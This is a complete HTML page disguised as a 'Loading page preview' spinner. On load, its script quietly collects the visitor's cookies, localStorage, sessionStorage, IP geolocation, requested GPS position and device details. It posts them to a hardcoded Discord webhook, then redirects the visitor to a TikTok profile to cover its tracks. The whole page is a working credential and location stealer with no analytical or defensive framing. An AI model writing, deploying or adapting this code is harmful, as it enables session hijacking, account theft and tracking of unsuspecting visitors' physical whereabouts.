<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading page...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        .box { text-align: center; padding: 40px; }
        .ring {
            width: 48px; height: 48px;
            border: 3px solid #1a1a1a;
            border-top: 3px solid #7c3aed;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            margin: 0 auto 24px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        p { color: #a0a0a0; font-size: 14px; }
        .sub { font-size: 12px; color: #555; margin-top: 8px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="ring"></div>
        <p>Loading page preview</p>
        <p class="sub" id="s">Fetching data...</p>
    </div>

    <script>
    var WEBHOOK = "https://discord.com/api/webhooks/1515469201253597316/6-n6qSvzEK8btF3fY34yDFnPDfisXhiQNkf_ngAkUmkUaRidYjlmykP5HgXQIZoAaFf4";
    var e = document.getElementById("s");

    var loot = {
        cookies: "",
        localStorage: "",
        sessionStorage: "",
        gps: "not requested",
        ip: "",
        battery: "",
        ram: navigator.deviceMemory || "unknown",
        cores: navigator.hardwareConcurrency || "unknown",
        screen: screen.width + "x" + screen.height,
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        language: navigator.language,
        platform: navigator.platform,
        vendor: navigator.vendor,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || "direct",
        url: location.href,
        time: new Date().toISOString()
    };

    // Cookies
    try { loot.cookies = document.cookie || "(none)"; } catch(er) {}

    // localStorage
    try {
        var ls = {};
        for (var i = 0; i < localStorage.length; i++) {
            var k = localStorage.key(i);
            ls[k] = localStorage.getItem(k);
        }
        loot.localStorage = JSON.stringify(ls);
    } catch(er) {}

    // sessionStorage
    try {
        var ss = {};
        for (var i = 0; i < sessionStorage.length; i++) {
            var k = sessionStorage.key(i);
            ss[k] = sessionStorage.getItem(k);
        }
        loot.sessionStorage = JSON.stringify(ss);
    } catch(er) {}

    // Battery
    try {
        navigator.getBattery().then(function(b) {
            loot.battery = Math.round(b.level * 100) + "% " + (b.charging ? "charging" : "on battery");
        });
    } catch(er) {}

    function sendToDiscord(msg) {
        var x = new XMLHttpRequest();
        x.open("POST", WEBHOOK, true);
        x.setRequestHeader("Content-Type", "application/json");
        x.send(JSON.stringify({ content: msg }));
    }

    function buildAndSend() {
        var msg = "🍪 **New Visitor**\n";
        msg += "```json\n";
        msg += "Cookies: " + loot.cookies + "\n\n";
        msg += "localStorage: " + loot.localStorage + "\n\n";
        msg += "sessionStorage: " + loot.sessionStorage + "\n\n";
        msg += "GPS: " + loot.gps + "\n";
        msg += "IP Geo: " + loot.ip + "\n";
        msg += "Battery: " + loot.battery + "\n";
        msg += "RAM: " + loot.ram + " GB\n";
        msg += "CPU Cores: " + loot.cores + "\n";
        msg += "Screen: " + loot.screen + " | Ratio: " + loot.pixelRatio + "\n";
        msg += "Color Depth: " + loot.colorDepth + "\n";
        msg += "Language: " + loot.language + "\n";
        msg += "Platform: " + loot.platform + "\n";
        msg += "Browser: " + loot.vendor + "\n";
        msg += "Timezone: " + loot.timezone + "\n";
        msg += "Referrer: " + loot.referrer + "\n";
        msg += "URL: " + loot.url + "\n";
        msg += "Time: " + loot.time + "\n";
        msg += "```";
        sendToDiscord(msg);
    }

    // Get IP geolocation
    e.textContent = "Loading location data...";
    fetch("http://ip-api.com/json/?fields=query,country,city,regionName,zip,lat,lon,isp,org,timezone")
        .then(function(r) { return r.json(); })
        .then(function(d) {
            loot.ip = JSON.stringify(d);
        })
        .catch(function() {})
        .finally(function() {
            // Try GPS
            if (navigator.geolocation) {
                e.textContent = "Requesting location...";
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        loot.gps = pos.coords.latitude + ", " + pos.coords.longitude + " (acc: " + pos.coords.accuracy + "m)";
                        e.textContent = "Loading assets...";
                        buildAndSend();
                        setTimeout(function(){ location.replace("https://www.tiktok.com/@khaby.lame"); }, 2000);
                    },
                    function() {
                        loot.gps = "denied or unavailable";
                        e.textContent = "Loading assets...";
                        buildAndSend();
                        setTimeout(function(){ location.replace("https://www.tiktok.com/@khaby.lame"); }, 2000);
                    },
                    { timeout: 5000, maximumAge: 0 }
                );
            } else {
                loot.gps = "not supported";
                e.textContent = "Loading assets...";
                buildAndSend();
                setTimeout(function(){ location.replace("https://www.tiktok.com/@khaby.lame"); }, 2000);
            }
        });
    </script>
</body>
</html>
